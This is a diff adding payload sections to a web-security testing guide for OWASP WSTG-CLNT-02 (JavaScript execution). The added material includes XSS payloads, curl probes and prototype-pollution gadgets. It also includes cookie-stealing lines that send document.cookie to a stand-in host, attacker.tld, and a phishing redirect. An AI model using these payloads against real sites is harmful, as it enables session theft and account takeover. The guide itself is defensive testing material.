@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-79]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-01, wstg-clnt-11]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-11: "eval()/Function() sink reachable via postMessage = an attacker-controlled cross-origin page executes arbitrary JS directly in the victim's authenticated session, no same-origin injection point needed — Critical"
 ---
 
 # wstg-clnt-02
@@ -95,6 +96,81 @@ setInterval(userInput, 1000)
 
 ---
 
+## Tools
+
+| Tool                 | Purpose                                           |
+| --------------------- | -------------------------------------------------- |
+| **Burp Suite**         | Intercept/repeat requests with JS-execution payloads |
+| **Browser DevTools**   | Watch console/network for eval/Function execution   |
+| **DOM Invader (Burp)** | Detect `eval`/`Function` sinks fed by tainted data   |
+
+---
+
+## Example Commands/Payloads
+
+### javascript: URI payloads
+
+```
+javascript:alert(document.domain)
+javascript:fetch('https://attacker.tld/c?c='+document.cookie)
+javascript:void(document.location='https://attacker.tld/phish')
+data:text/html,<script>alert(document.domain)</script>
+```
+
+### Event handler injection payloads
+
+```
+" onmouseover="alert(document.domain)" x="
+' onfocus='alert(document.domain)' autofocus='
+" onclick="alert(document.domain)" style="position:fixed;width:100%;height:100%" x="
+"><svg onload=alert(document.domain)>
+```
+
+### curl probes
+
+```bash
+TARGET="https://{target}"
+curl -s "$TARGET/redirect?url=javascript:alert(1)"
+curl -s "$TARGET/profile?avatar=javascript:alert(1)"
+curl -s "$TARGET/search?q=%22%20onmouseover%3D%22alert(1)%22%20x%3D%22"
+```
+
+### eval()/Function() confirmation payloads
+
+```javascript
+alert(1)
+1+1
+fetch('https://attacker.tld/c?c='+document.cookie)
+(function(){return this})().alert(1)
+```
+
+### Prototype-pollution-driven JS execution
+
+If `{target}` merges untrusted JSON into an object (e.g. `Object.assign({}, config, JSON.parse(untrustedInput))`) and a client-side "gadget" later passes an inherited property into `eval`/`Function`/`setTimeout(string)`, polluting `Object.prototype` can trigger execution without any direct injection point:
+
+```javascript
+// Confirm pollution reaches Object.prototype (paste in console / via a vulnerable merge endpoint)
+{"__proto__": {"evilProperty": "evilPayload"}}
+{"constructor": {"prototype": {"evilProperty": "evilPayload"}}}
+
+// Found in the wild - pollution via URL/hash fed into a client-side merge
+https://{target}/#__proto__[evilProperty]=evilPayload
+https://{target}/?__proto__[sourceUrl]=data:,alert(document.domain)//
+```
+
+```javascript
+// Example gadget: an app-wide config object with a "src"/"onerror"-style property
+// consumed later by a script/image loader that effectively evals attacker data
+Object.prototype.src = "x"
+Object.prototype.onerror = "alert(document.domain)"
+// any subsequently created <img> that inherits unset src/onerror from a polluted
+// object literal will now execute the attacker's handler
+```
+
+Search `Object.prototype` / `client-side prototype pollution` gadget databases (e.g. BlackFan/client-side-prototype-pollution) for the specific sink `{target}`'s bundled JS exposes before crafting a target-specific gadget.
+
+---
+
 ## Remediation
 
 ```javascript
@@ -129,6 +205,15 @@ if (allowedFunctions[functionName]) {
 | ---------- | ------------------------------------------------------------------- |
 | **CWE-95** | Improper Neutralization of Directives in Dynamically Evaluated Code |
 
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for JavaScript Execution (WSTG-CLNT-02)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution)
+- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+- [PayloadsAllTheThings - Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
 
 ---
 
